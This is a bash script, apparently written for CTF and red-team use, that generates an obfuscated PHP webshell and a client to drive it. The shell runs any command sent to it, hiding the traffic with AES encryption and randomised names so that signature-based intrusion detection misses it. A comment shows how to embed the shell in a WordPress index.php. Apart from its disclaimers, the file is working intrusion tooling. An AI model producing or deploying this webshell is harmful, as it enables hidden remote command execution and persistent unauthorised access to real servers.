#!/bin/bash

# I created this script for CTF and Authorized testing only.
#
# We should make our webshell as discreet as possible to avoid spoiling the experience for other players
# Also, during a real engagement we should avoid leaving any webshells that could endanger a client,
# So, we may as well obfuscate them a little bit to minimized third-party access.. 
# Remember to to delete the shell after getting  some level of persistence. 
# Always clean up after your done.
#
# 
# Attention, do not use it in nefarious ways!
#
# Cheers !

generate_token(){
    token=''
    SEED=`echo ${RANDOM} | md5sum - | awk '{print $1}'`
    for ((i=1; i<32; i++)); do
        n=${SEED:$i:1}
        [[ $n -eq '0' ]] && [[  $n !=  0 ]] && token="${token}${n}"
    done
    echo $token
}

# This looks like dog shit, but the purporse was to generate some dynamic code.
# This should make  detection  slighly harder by signature based tools.
a1=$(generate_token)
a2=$(generate_token)
a3=$(generate_token)
a4=$(generate_token | md5sum - | awk '{print $1}')
a5=$(generate_token)e 
a7=$(generate_token)
a8=$(generate_token | md5sum - | awk '{print $1}')
a9=$(generate_token)
a10=$(generate_token | md5sum - | awk '{print $1}')
a11=$(generate_token)
a12=$(generate_token)

# Attention Redteamers!
#
# Also we implemented symetric encryption 
# The key is auto generated as well and will be uncovered in the momment 
# someone glance at the webshell.
# The goal here is only bypass Intrution Dection Systems, but will not work against a human. 
# Even if deleted, if a blueteam member  manages to recover the file, they will be able to decrypt it,
# and see the commands that were executed provided they had sufficient logging in place! 

# You should delete the webshell as soon as possible and or embeded it on another page.
# Like in the example bellow
# cat ../../../index.php xyz.php > /tmp/t; mv /tmp/t /var/www/html/wordpress/index.php; rm -f xyz.php

cat>${a7}.php<<EOF_
<?php
     \$${a1} = '${a4}';
     \$${a5} = '${a4}';
     if (! isset(\$_REQUEST['${a2}']) || \$_REQUEST['${a2}'] !== \$${a1}){
         exit();
     }
     if (! isset(\$_REQUEST['${a3}'])){
         exit();
     }
     \$${a5} = \$_REQUEST['${a3}'];
     \$${a9} = openssl_decrypt(\$${a5}, 'AES-256-CBC', '${a8}', NULL, '${a10:0:16}');
     if (\$${a5} !== '${a4}') {
        if (isset(\$${a9})) {
            \$${a11} =  \`\$${a9}\`;
            \$${a12} =  openssl_encrypt(\$${a11}, 'AES-256-CBC', '${a8}', NULL, '${a10:0:16}');
            echo \$${a12};       
        }
     }
?>
EOF_

cat>client-${a7}.php<<EOF_
<?php

\$url = \$_REQUEST['url'];
if (! isset(\$url)){
 exit();
}

\$cmd = \$_REQUEST['cmd'];
if (! isset(\$cmd)){
 exit();
}

\$payload = openssl_encrypt(\$cmd, 'AES-256-CBC', '${a8}', NULL, '${a10:0:16}');
\$data = ['${a2}' => '${a4}', '${a3}' => \$payload];

\$options = [
    'http' => [
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query(\$data),
    ],
];

\$context = stream_context_create(\$options);
\$result = file_get_contents(\$url, false, \$context);
if (! isset(\$result) ) {
    exit();
}
\$clear = openssl_decrypt(\$result, 'AES-256-CBC', '${a8}', NULL, '${a10:0:16}');
echo \$clear;
?>
EOF_

rm -f .tmp.txt 2> /dev/null
cat>.tmp.txt<<EOF_
Example => Run the commands using the auto generated client:

php-cgi -f client-${a7}.php url=http://127.0.0.1/${a7}.php cmd='id'
EOF_

cat .tmp.txt
rm -f .tmp.txt 2> /dev/null

# Again, this could be used by redteamers, but still quite CTFy....
# I'd recommend using on HTB, where is quite common sharing a boxes etc...